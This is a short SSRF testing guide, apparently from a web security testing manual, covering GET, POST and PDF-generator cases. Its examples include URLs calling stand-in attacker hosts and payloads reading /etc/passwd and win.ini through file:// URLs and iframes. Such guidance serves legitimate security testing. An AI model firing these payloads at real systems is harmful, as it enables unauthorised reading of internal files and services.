Overview
--------
In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a modify a request which the code running on the server will process. By carefully selecting the details, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP enabled databases, or perform POST requests towards internal services which are not intended to be exposed.

### Description
The target application may have functionality for importing data from a URL, publishing data to a URL, or otherwise reading data from a request that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different request or by manipulating how requests are built (path traversal, etc.).

Some common vulnerabilities related to server-side request forgery:
- URL redirection
- Remote file inclusion
- SQL injection
- Link Injection

### How to Test

#### Case I: End points which fetch external/internal resources

With GET request:
- http://example.com/index.php?page=about.php
- http://example.com/index.php?page=https://attackersite.com
- http://example.com/index.php?page=file:///etc/passwd

With POST request:

	POST /test/ssrf_form.php HTTP/1.1
	Host: example.com

	url=https://hacker.com/as&name2=value2

#### Case II: PDF generators 

There are some cases where server converts uploaded file to a pdf.Try injecting <iframe>, <img>, <base> or <script> elements or CSS url() functions pointing to internal services.

	<iframe src="file:///etc/passwd" width="400" height="400">
	<iframe src="file:///c:/windows/win.ini" width="400" height=”400">

Tools
----- 
Burpsuite, ZAP

References
------------
* [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
* [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
